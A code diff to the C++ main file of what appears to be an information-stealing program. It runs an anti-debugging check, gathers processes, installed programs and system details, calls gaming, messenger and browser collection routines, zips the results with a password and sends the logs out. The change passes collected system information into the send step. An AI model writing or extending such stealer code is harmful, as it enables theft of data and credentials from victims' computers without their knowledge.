@@ -30,12 +30,14 @@
 #include "scripts/scripts.h"
 #include "targets/targets.h"
 
+
 /// <summary>
 /// call secure functions
 /// </summary>
 void Functions();
 
-void SystemInfo();
+
+void SystemInfo(std::string& sendInfo);
 
 void Gaming();
 
@@ -43,7 +45,7 @@ void Messengers();
 
 void Other();
 
-void Ending();
+void Ending(std::string& sendInfo);
 
 /// <summary>
 /// Main function in the program. 
@@ -64,7 +66,9 @@ void Functions()
 		antidebug::AntiDebug();
 	manager::MakeDirs();
 
-	SystemInfo();
+	std::string sendInfo = "";
+
+	SystemInfo(sendInfo);
 
 	Gaming();
 
@@ -72,16 +76,16 @@ void Functions()
 
 	Other();
 
-	Ending();
+	Ending(sendInfo);
 }
 
-void SystemInfo() 
+void SystemInfo(std::string& sendInfo)
 {
 	cursystem::GetProcesses();
 
 	cursystem::GetProgs();
 
-	cursystem::GetSysInfo();
+	cursystem::GetSysInfo(sendInfo);
 }
 
 void Gaming() 
@@ -122,12 +126,12 @@ void Other()
 	//browsers::FireFox();
 }
 
-void Ending() 
+void Ending(std::string& sendInfo)
 {
 	std::string zipName;
 	std::string password;
 
 	manager::MakeZip(zipName, password);
 
-	manager::SendLogs(zipName, password);
+	manager::SendLogs(zipName, password, sendInfo);
 }
